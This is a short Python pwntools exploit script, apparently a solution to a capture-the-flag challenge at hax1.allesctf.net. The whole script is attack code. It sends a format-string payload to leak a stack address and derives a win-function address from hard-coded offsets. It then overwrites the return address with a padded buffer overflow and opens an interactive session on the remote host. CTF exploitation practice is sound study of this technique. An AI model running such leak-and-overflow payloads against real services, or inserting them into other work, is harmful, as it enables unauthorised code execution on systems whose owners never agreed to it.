from pwn import *

# p = process("./pwn1")
# p = remote("192.168.0.12", 9100)
p = remote("hax1.allesctf.net", 9100)

p.recvuntil("Enter your witch name:")
print("Sending format string exploit...")
p.sendline("%p|" * 42)
# printf("%p|%p...");

WIN_OFFSET = 0x135
LEAKS = p.recvuntil("enter your magic spell:").split("|")

print("Leaked main function address: " + LEAKS[-5])
MAIN=int(LEAKS[-5], 16)

WIN = MAIN - WIN_OFFSET
WIN_RET_OFFSET = 0x36
WIN_RET = WIN + 0x36

# 6161 6e 63
# a a n c
PADDING = 'A' * cyclic_find("cnaa")
# 250 * A

# raw_input("attach gdb")
p.sendline("Expelliarmus\x00" + PADDING + p64(WIN_RET) + p64(WIN))
p.interactive()
